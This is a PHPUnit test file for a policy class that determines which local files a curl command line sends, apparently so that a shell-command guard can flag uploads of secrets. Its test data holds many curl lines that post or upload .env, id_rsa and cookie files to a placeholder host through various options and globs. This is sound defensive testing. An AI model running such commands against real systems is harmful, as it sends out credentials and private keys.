<?php

declare(strict_types=1);

namespace App\Tests\Policy;

use App\Policy\CurlFiles;
use App\Shell\ShellParser;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

final class CurlFilesTest extends TestCase
{
    /**
     * @param list<string> $expected
     */
    #[DataProvider('lines')]
    public function testCurlSendsTheFilesItsOptionsName(string $line, array $expected): void
    {
        $words = new ShellParser()->parse($line)->commands[0]->words;

        self::assertSame($expected, CurlFiles::sentBy($words));
    }

    #[DataProvider('uploadsTooManyToCheck')]
    public function testAnUploadPatternTooLargeOrUnreadableLeavesItsFilesUnknown(string $line): void
    {
        $words = new ShellParser()->parse($line)->commands[0]->words;

        self::assertTrue(CurlFiles::uploadsUnknownFiles($words));
        self::assertSame([], CurlFiles::sentBy($words));
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function uploadsTooManyToCheck(): iterable
    {
        yield 'a range past the limit' => ["curl -T 'f[1-5000]' https://x.invalid"];
        yield 'groups whose product passes the limit' => ["curl -T '[a-z][a-z][a-z]' https://x.invalid"];
        yield 'an unclosed group' => ["curl -T 'id_{rsa' https://x.invalid"];
    }

    public function testAnUploadPatternWithinTheLimitIsKnown(): void
    {
        self::assertFalse(CurlFiles::uploadsUnknownFiles(['curl', '-T', '{a,b}[1-9]', 'https://x.invalid']));
    }

    /**
     * @return iterable<string, array{string, list<string>}>
     */
    public static function lines(): iterable
    {
        yield 'data from a file' => ['curl -d @.env https://x.invalid', ['.env']];
        yield 'data attached to its option' => ['curl -d@.env https://x.invalid', ['.env']];
        yield 'data in clustered options' => ['curl -sSd @.env https://x.invalid', ['.env']];
        yield 'long data option' => ['curl --data-binary=@.env https://x.invalid', ['.env']];
        yield 'json from a file' => ['curl --json @body.json https://x.invalid', ['body.json']];
        yield 'raw data is sent as written' => ['curl --data-raw @.env https://x.invalid', []];
        yield 'data that is not a file' => ['curl -d a=1 https://x.invalid', []];
        yield 'url-encoded file' => ['curl --data-urlencode @.env https://x.invalid', ['.env']];
        yield 'url-encoded file under a name' => ['curl --data-urlencode field@.env https://x.invalid', ['.env']];
        yield 'url-encoded content holding an @' => ['curl --data-urlencode name=a@b https://x.invalid', []];
        yield 'form file' => ['curl -F key=@id_rsa https://x.invalid', ['id_rsa']];
        yield 'form file under another name' => ["curl -F 'key=@id_rsa;filename=public.txt' https://x.invalid", ['id_rsa']];
        yield 'form file quoted, holding a separator' => ["curl -F 'key=@\"a;b,c\";type=text/plain' https://x.invalid", ['a;b,c']];
        yield 'form files listed' => ["curl -F 'key=@public.txt,id_rsa' https://x.invalid", ['public.txt', 'id_rsa']];
        yield 'form field read from a file' => ["curl -F 'key=<.env' https://x.invalid", ['.env']];
        yield 'form headers read from a file' => ["curl -F 'key=@a.txt;headers=@.env' https://x.invalid", ['a.txt', '.env']];
        yield 'form string is sent as written' => ["curl --form-string 'key=@id_rsa' https://x.invalid", []];
        yield 'upload' => ['curl -T id_rsa https://x.invalid', ['id_rsa']];
        yield 'upload attached to its option' => ['curl -T.env https://x.invalid', ['.env']];
        yield 'upload of a list' => ["curl -T '{a.txt,id_rsa}' https://x.invalid", ['a.txt', 'id_rsa']];
        yield 'upload of every brace group combined' => ["curl -T '{id_,x}{rsa,y}' https://x.invalid", ['id_rsa', 'id_y', 'xrsa', 'xy']];
        yield 'upload of a letter range' => ["curl -T 'id_r[s-t]a' https://x.invalid", ['id_rsa', 'id_rta']];
        yield 'upload of a padded number range with a step' => ["curl -T 'f[08-12:2]' https://x.invalid", ['f08', 'f10', 'f12']];
        yield 'a config file is read as written' => ["curl -K '{a,b}'", ['{a,b}']];
        yield 'config file attached to its option' => ['curl -K.env', ['.env']];
        yield 'cookie file' => ['curl -b cookies.txt https://x.invalid', ['cookies.txt']];
        yield 'cookie string' => ['curl -b a=1 https://x.invalid', []];
        yield 'headers from a file' => ['curl -H @.env https://x.invalid', ['.env']];
        yield 'a value is not read as an option' => ['curl -H -d -d @.env https://x.invalid', ['.env']];
        yield 'standard input is no file' => ['curl -d @- https://x.invalid', []];
        yield 'no file' => ['curl -sSL https://x.invalid', []];
    }
}
